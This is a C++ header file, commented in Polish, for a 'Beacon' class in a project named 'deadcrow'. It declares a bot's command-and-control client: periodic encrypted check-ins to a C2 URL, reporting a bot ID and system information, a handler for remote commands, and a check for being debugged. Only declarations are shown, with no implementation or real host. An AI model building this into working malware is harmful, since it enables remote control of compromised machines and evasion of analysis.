#pragma once

#include <string>
#include <vector>
#include <functional>
#include <chrono>
#include <thread>
#include <mutex>
#include <atomic>
#include <memory>

namespace deadcrow {
namespace core {

class Beacon {
public:
    // Konstruktor
    Beacon(const std::string& c2_url, const std::string& aes_key);
    
    // Destruktor
    ~Beacon();
    
    // Rozpoczęcie beaconing
    bool start(int interval_seconds = 60);
    
    // Zatrzymanie beaconing
    void stop();
    
    // Wykonanie jednorazowego check-in
    bool checkIn();
    
    // Ustawienie callbacka do raportowania statusu
    void setStatusCallback(std::function<void(const std::string&)> callback);
    
    // Ustawienie callbacka do obsługi komend
    void setCommandHandler(std::function<bool(const std::string&, const std::string&)> handler);
    
    // Sprawdzenie, czy beacon jest aktywny
    bool isActive() const;
    
    // Ustawienie danych identyfikacyjnych bota
    void setBotInfo(const std::string& bot_id, const std::string& system_info);
    
private:
    // URL serwera C2
    std::string c2_url_;
    
    // Klucz AES do szyfrowania komunikacji
    std::string aes_key_;
    
    // ID bota
    std::string bot_id_;
    
    // Informacje o systemie
    std::string system_info_;
    
    // Wątek beaconing
    std::unique_ptr<std::thread> beacon_thread_;
    
    // Flaga aktywności
    std::atomic<bool> active_;
    
    // Mutex do synchronizacji
    std::mutex mutex_;
    
    // Callback do raportowania statusu
    std::function<void(const std::string&)> status_callback_;
    
    // Callback do obsługi komend
    std::function<bool(const std::string&, const std::string&)> command_handler_;
    
    // Funkcja wykonywana w wątku beaconing
    void beaconLoop(int interval_seconds);
    
    // Wysłanie żądania do C2
    std::string sendRequest(const std::string& endpoint, const std::string& data);
    
    // Parsowanie odpowiedzi z C2
    bool parseResponse(const std::string& response);
    
    // Raportowanie statusu
    void reportStatus(const std::string& status);
    
    // Sprawdzanie, czy nie jesteśmy debugowani
    bool checkForDebugging();
};

} // namespace core
} // namespace deadcrow
